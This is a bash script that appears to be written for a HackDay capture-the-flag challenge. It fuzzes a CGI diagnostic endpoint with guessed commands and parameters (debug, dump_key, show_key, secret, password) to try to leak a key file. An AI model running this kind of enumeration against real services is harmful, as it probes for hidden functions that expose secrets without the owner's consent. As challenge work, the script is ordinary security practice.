#!/bin/bash
BASE="http://millenium-messenger.hackday.fr:8000"

echo "=== Try various unknown commands ==="
for cmd in DEBUG KEY MEM DUMP SHOW READ ECHO PING ENV SYS EXEC CRASH SEGV HEAP STACK ADDR INFO STAT CHECK LOAD GET; do
    resp=$(curl -s "$BASE/cgi-bin/msn_diag?cmd=$cmd")
    echo "$cmd: $resp"
done

echo ""
echo "=== Try lowercase ==="
for cmd in debug key mem dump show read echo ping env sys exec stat check load get; do
    resp=$(curl -s "$BASE/cgi-bin/msn_diag?cmd=$cmd")
    if ! echo "$resp" | grep -q "Unknown command"; then
        echo "$cmd: $resp"
    fi
done

echo ""
echo "=== Try MSG with special keywords ==="
for body in key KEY epoch KEY_FILE /app/data/msn_epoch.key GETKEY SHOWKEY DUMPKEY MEMKEY; do
    resp=$(curl -s "$BASE/cgi-bin/msn_diag?cmd=MSG&body=$body")
    echo "MSG $body: $resp"
done

echo ""
echo "=== Try STA command with special params ==="
curl -s "$BASE/cgi-bin/msn_diag?cmd=STA&verbose=1"
echo ""
curl -s "$BASE/cgi-bin/msn_diag?cmd=STA&key=1"
echo ""
curl -s "$BASE/cgi-bin/msn_diag?cmd=STA&debug=1"
echo ""
curl -s "$BASE/cgi-bin/msn_diag?cmd=STA&show_key=1"
echo ""

echo "=== Extra params ==="
for param in secret password auth admin key token file show_key dump_key verbose debug; do
    for val in 1 true admin epoch password key; do
        resp=$(curl -s "$BASE/cgi-bin/msn_diag?cmd=STA&$param=$val")
        if ! echo "$resp" | grep -q "^Content-Type: text/plain"; then
            echo "STA&$param=$val: $resp"
        elif echo "$resp" | grep -qv "LOADED"; then
            echo "STA&$param=$val: $resp"
        fi
    done
done
